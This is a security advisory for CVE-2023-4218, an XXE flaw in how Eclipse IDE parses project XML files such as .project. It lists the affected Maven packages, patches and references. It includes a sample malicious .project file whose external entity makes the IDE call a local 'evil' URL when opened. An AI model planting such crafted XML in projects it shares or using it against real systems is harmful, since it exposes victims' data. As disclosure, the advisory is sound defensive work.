# [M] Eclipse IDE XXE in eclipse.platform

## Summary
Severity: Medium
Advisory: GHSA-j24h-xcpc-9jw8
CVE: CVE-2023-4218
Ecosystem: Maven
CVSS: CVSS:3.1/AV:L/AC:L/PR:L/UI:R/S:U/C:H/I:N/A:N (CVSS_V3)
Published: 2023-11-30
Source: https://github.com/advisories/GHSA-j24h-xcpc-9jw8
Type: github-advisory

## Affected
- Maven: `org.eclipse.platform:org.eclipse.core.runtime` — affected >=0 <3.29.0
- Maven: `org.eclipse.platform:org.eclipse.platform` — affected >=0 <4.29.0
- Maven: `org.eclipse.platform:org.eclipse.jface` — affected >=0 <3.31.0
- Maven: `org.eclipse.platform:org.eclipse.ui.forms` — affected >=0 <3.13.0
- Maven: `org.eclipse.platform:org.eclipse.ui.ide` — affected >=0 <3.21.100
- Maven: `org.eclipse.platform:org.eclipse.ui.workbench` — affected >=0 <3.130.0
- Maven: `org.eclipse.platform:org.eclipse.urischeme` — affected >=0 <1.3.100
- Maven: `org.eclipse.jdt:org.eclipse.jdt.ui` — affected >=0 <3.30.0

## Details
### Impact
xml files like ".project" are parsed vulnerable against all sorts of XXE attacks. The user just needs to open any evil project or update an open project with a vulnerable file (for example for review  a foreign repository or patch).

Vulnerablility was found by static code analysis (SonarLint).

Example `.project` file:
```
<?xml version="1.0" encoding="utf-8"?> 
<!DOCTYPE price [
<!ENTITY xxe SYSTEM "http://127.0.0.1:49416/evil">]>
<projectDescription>
	<name>p</name>
	<comment>&xxe;</comment>
</projectDescription>
```

### Patches
Similar patches including junit test that shows the vulnerability have already applied to PDE (see https://github.com/eclipse-pde/eclipse.pde/pull/667). A solution to platform should be the same: just reject parsing any XML that contains any `DOCTYPE`.

### Workarounds
No known workaround. User can only avoid to get/open any foreign files with eclipse. Firewall rules against loss of data (but not against XML bomb).

### References
https://cwe.mitre.org/data/definitions/611.html
https://rules.sonarsource.com/java/RSPEC-2755
https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/8 (Report for multiple projects affected)

## References
- https://github.com/eclipse-platform/eclipse.platform/security/advisories/GHSA-j24h-xcpc-9jw8
- https://nvd.nist.gov/vuln/detail/CVE-2023-4218
- https://github.com/eclipse-emf/org.eclipse.emf/issues/10
- https://github.com/eclipse-pde/eclipse.pde/pull/632
- https://github.com/eclipse-pde/eclipse.pde/pull/667
- https://github.com/eclipse-platform/eclipse.platform.releng.buildtools/pull/45
- https://github.com/eclipse-platform/eclipse.platform/pull/761
- https://github.com/eclipse-cdt/cdt/commit/c7169b3186d2fef20f97467c3e2ad78e2943ed1b
- https://github.com/eclipse-jdt/eclipse.jdt.core/commit/38dd2a878f45cdb3d8d52090f1d6d1b532fd4c4d
- https://github.com/eclipse-jdt/eclipse.jdt.ui/commit/13675b1f8a74f47de4da89ed0ded6af7c21dfbec
- https://github.com/eclipse-platform/eclipse.platform.swt/commit/bf71db5ddcb967c0863dad4745367b54f49e06ba
- https://github.com/eclipse-platform/eclipse.platform.ui/commit/f243cf0a28785b89b7c50bf4e1cce48a917d89bd
- https://github.com/eclipse-platform/eclipse.platform/commit/5dc372a0c5002b7f22e5d49eaa1cbf0916455daf
- https://github.com/eclipse-platform/eclipse.platform
- https://gitlab.eclipse.org/security/vulnerability-reports/-/issues/8
